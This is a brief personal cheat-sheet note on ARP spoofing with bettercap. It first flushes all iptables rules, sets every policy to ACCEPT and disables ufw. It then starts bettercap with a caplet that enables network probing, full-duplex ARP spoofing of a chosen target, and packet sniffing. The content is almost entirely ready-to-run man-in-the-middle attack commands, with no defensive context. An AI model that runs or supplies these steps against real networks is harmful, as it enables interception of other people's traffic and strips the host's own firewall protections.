---
tags: [ "network", "arp", "security", "bettercap", "mitm" ]
aliases: [ "ARP Poisoning", "Layer 2 Analysis" ]
created: 2025-12-21
---

# arpSpoof

Disable firewalls first:

```bash
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

sudo ufw disable
```

(Enable after pls : ('sudo ufw enable'))

bettercap --iface eth0 --caplet spoof.cap

Caplet "bettercap":
net.probe on

```bash
set arp.spoof.fullduplex true
set arp.spoof.targets (target)
```

arp.spoof on
net.sniff on
